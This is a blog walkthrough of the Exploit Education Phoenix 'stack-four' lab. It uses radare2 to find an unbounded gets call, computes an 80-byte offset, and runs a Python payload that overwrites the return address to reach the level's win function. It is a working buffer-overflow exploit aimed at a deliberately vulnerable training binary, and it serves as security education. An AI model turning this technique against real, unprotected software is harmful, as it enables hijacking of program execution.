---
layout: post
title:  "Phoenix x86 Stack Four"
date: "2019-10-13 11:30:00 +0300"
categories: exploit-education phoenix x86
---

{% highlight shell %}
$ rabin2 -I /opt/phoenix/i486/stack-four 
arch     x86
baddr    0x8048000
binsz    3608
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (GNU) 7.3.0
crypto   false
endian   little
havecode true
intrp    /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
relro    no
rpath    /opt/phoenix/i486-linux-musl/lib
sanitiz  false
static   false
stripped false
subsys   linux
va       true
{% endhighlight %}

Same info as the previous levels.

{% highlight shell %}
$ r2 /opt/phoenix/i486/stack-four 
{% endhighlight %}

{% highlight nasm %}
[0x08048350]> aas
Cannot analyze at 0x080485b0
[0x08048350]> afl
0x080482d8    1 17           sym._init
0x080484a0    7 277  -> 112  sym.frame_dummy
0x08048570    5 49           sym.__do_global_ctors_aux
0x080485a1    1 12           sym._fini
0x08048420    8 113  -> 111  sym.__do_global_dtors_aux
0x08048114   45 492  -> 538  sym..interp
0x08048350    1 62           entry0
0x08048340    1 6            sym.imp.__libc_start_main
0x0804865c    1 14           loc.__GNU_EH_FRAME_HDR
0x08048688    3 34           sym..eh_frame
0x080486c4    1 9            obj.__EH_FRAME_BEGIN
0x08048390    4 49   -> 40   sym.deregister_tm_clones
0x0804872c    1 4            obj.__FRAME_END
0x08048505    1 49           sym.start_level
0x08048310    1 6            sym.imp.gets
0x08048300    1 6            sym.imp.printf
0x08048536    1 51           main
0x08048320    1 6            sym.imp.puts
0x080484e5    1 32           sym.complete_level
0x08048330    1 6            sym.imp.exit
[0x08048350]> s main
[0x08048536]> pdf
/ (fcn) main 51
|   int main (int argc, char **argv, char **envp);
|           ; var int32_t var_4h @ ebp-0x4
|           ; arg int32_t arg_4h @ esp+0x4
|           ; DATA XREF from entry0 @ 0x8048384
|           0x08048536      8d4c2404       lea ecx, [arg_4h]
|           0x0804853a      83e4f0         and esp, 0xfffffff0
|           0x0804853d      ff71fc         push dword [ecx - 4]
|           0x08048540      55             push ebp
|           0x08048541      89e5           mov ebp, esp
|           0x08048543      51             push ecx
|           0x08048544      83ec04         sub esp, 4
|           0x08048547      83ec0c         sub esp, 0xc
|           0x0804854a      6810860408     push str.Welcome_to_phoenix_stack_four__brought_to_you_by_https:__exploit.education ; 0x8048610 ; "Welcome to phoenix/stack-four, brought to you by https://exploit.education"
|           0x0804854f      e8ccfdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x08048554      83c410         add esp, 0x10
|           0x08048557      e8a9ffffff     call sym.start_level
|           0x0804855c      b800000000     mov eax, 0
|           0x08048561      8b4dfc         mov ecx, dword [var_4h]
|           0x08048564      c9             leave
|           0x08048565      8d61fc         lea esp, [ecx - 4]
\           0x08048568      c3             ret
[0x08048536]> s sym.start_level
[0x08048505]> pdf
/ (fcn) sym.start_level 49
|   sym.start_level (int32_t arg_4h);
|           ; var int32_t var_4ch @ ebp-0x4c
|           ; var int32_t var_ch @ ebp-0xc
|           ; arg int32_t arg_4h @ ebp+0x4
|           ; CALL XREF from main @ 0x8048557
|           0x08048505      55             push ebp
|           0x08048506      89e5           mov ebp, esp
|           0x08048508      83ec58         sub esp, 0x58
|           0x0804850b      83ec0c         sub esp, 0xc
|           0x0804850e      8d45b4         lea eax, [var_4ch]
|           0x08048511      50             push eax
|           0x08048512      e8f9fdffff     call sym.imp.gets           ; char *gets(char *s)
|           0x08048517      83c410         add esp, 0x10
|           0x0804851a      8b4504         mov eax, dword [arg_4h]
|           0x0804851d      8945f4         mov dword [var_ch], eax
|           0x08048520      83ec08         sub esp, 8
|           0x08048523      ff75f4         push dword [var_ch]
|           0x08048526      68f3850408     push str.and_will_be_returning_to__p ; 0x80485f3 ; "and will be returning to %p\n"
|           0x0804852b      e8d0fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048530      83c410         add esp, 0x10
|           0x08048533      90             nop
|           0x08048534      c9             leave
\           0x08048535      c3             ret
[0x08048505]> 
{% endhighlight %}

There is a vulnerable `gets` call in the function `sym.start_level`. The objective seems to be to overwrite the return address of that function to return to the function `sym.complete_level` at address `0x080484e5`.

In order to do that, it is essential to calculate the number of bytes that need to be written on the stack to overwrite the return address.

There are a couple of ways:
* use `ragg2` to generate a cyclic pattern, called De Bruijn Sequence, and check the exact offset where the payload overrides the return address.
* calculate it manually.

For the first option:

{% highlight shell %}
$ ragg2 -P 200 -r > pattern
{% endhighlight %}

The argument `-P` prepends a De Bruijn Sequence with a size of 200. The argument `-r` shows raw bytes instead of hexpairs.

{% highlight shell %}
#!/usr/bin/env rarun2
stdio=/dev/pts/0
stdin=./pattern
{% endhighlight %}

*Replace `/dev/pts/0` with the output of the command `tty` and `./pattern` with the full path to the file that contains the input to be read from the binary.*

{% highlight shell %}
$ r2 -d /opt/phoenix/i486/stack-four -r myProfile.rr2
{% endhighlight %}

{% highlight nasm %}
[0xf7f3ed4b]> dc
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41416241
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41416241 code=1 ret=0
[0x41416241]> wopO 0x41416241
80
{% endhighlight %}

*Replace the address that follows `wopO` with the value of the `eip` register.*

The result of the last operation is the offset that is needed to reach the return address, but not overwrite it.

With the second option, viewing the local variables is enough. The buffer starts at `ebp-0x4c`, which means that to reach `ebp` a size of 76 bytes is needed. Adding another 4 bytes overwrites the old `ebp` value that is on the stack and adding 4 bytes again means overwriting the return address.

{% highlight python %}
#!/usr/bin/env python3
import os

os.write(1, b'\x58'*80 + b'\xe5\x84\x04\x08')
{% endhighlight %}

{% highlight shell %}
$ ./stack-zero.py > pattern 
$ r2 -d /opt/phoenix/i486/stack-four -r myProfile.rr2
{% endhighlight %}

{% highlight nasm %}
[0xf7fb8d4b]> aas
Cannot analyze at 0x080485b0
[0xf7fb8d4b]> db 0x08048512
[0xf7fb8d4b]> dc
Welcome to phoenix/stack-four, brought to you by https://exploit.education
hit breakpoint at: 8048512
[0x08048512]> dr
eax = 0xfff94b5c
ebx = 0xf7fee000
ecx = 0xfff94af0
edx = 0x00000000
esi = 0xfff94c44
edi = 0x00000001
esp = 0xfff94b40
ebp = 0xfff94ba8
eip = 0x08048512
eflags = 0x00000296
oeax = 0xffffffff
[0x08048512]> px/28xw 0xfff94b40
0xfff94b40  0xfff94b5c 0xf7fee1e0 0x00000000 0xf7fa8ab8  \K..............
0xfff94b50  0xf7fee1e0 0xfff94b6f 0x00000001 0x0000000a  ....oK..........
0xfff94b60  0x08048610 0x080485a1 0x00000000 0x0afaa038  ............8...
0xfff94b70  0xf7fa8a5b 0xf7fee000 0xf7fee1e0 0xf7fab958  [...........X...
0xfff94b80  0xf7fee1e0 0x0000000a 0x00000000 0x00000000  ................
0xfff94b90  0xf7fee000 0xfff94c44 0x00000001 0x08048554  ....DL......T...
0xfff94ba0  0x08048610 0x00000000 0xfff94bb8 0x0804855c  .........K..\...
[0x08048512]> px/xw 0xfff94ba8+0x4
0xfff94bac  0x0804855c                                   \...
[0x08048512]> dso
hit breakpoint at: 8048517
[0x08048512]> px/28xw 0xfff94b40
0xfff94b40  0xfff94b5c 0xf7fee1e0 0x00000000 0xf7fa8ab8  \K..............
0xfff94b50  0xf7fee1e0 0xfff94b6f 0x00000001 0x58585858  ....oK......XXXX
0xfff94b60  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
0xfff94b70  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
0xfff94b80  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
0xfff94b90  0x58585858 0x58585858 0x58585858 0x58585858  XXXXXXXXXXXXXXXX
0xfff94ba0  0x58585858 0x58585858 0x58585858 0x080484e5  XXXXXXXXXXXX....
[0x08048512]> px/xw 0xfff94ba8+0x4
0xfff94bac  0x080484e5                                   ....
[0x08048512]> dc
and will be returning to 0x80484e5
Congratulations, you've finished phoenix/stack-four :-) Well done!
{% endhighlight %}

## Conclusion
This level introduced a case where an attacker can control the execution of the program by simply writing more bytes than the buffer can hold, so that the return address of the function that contains the vulnerable `gets` call is overwritten.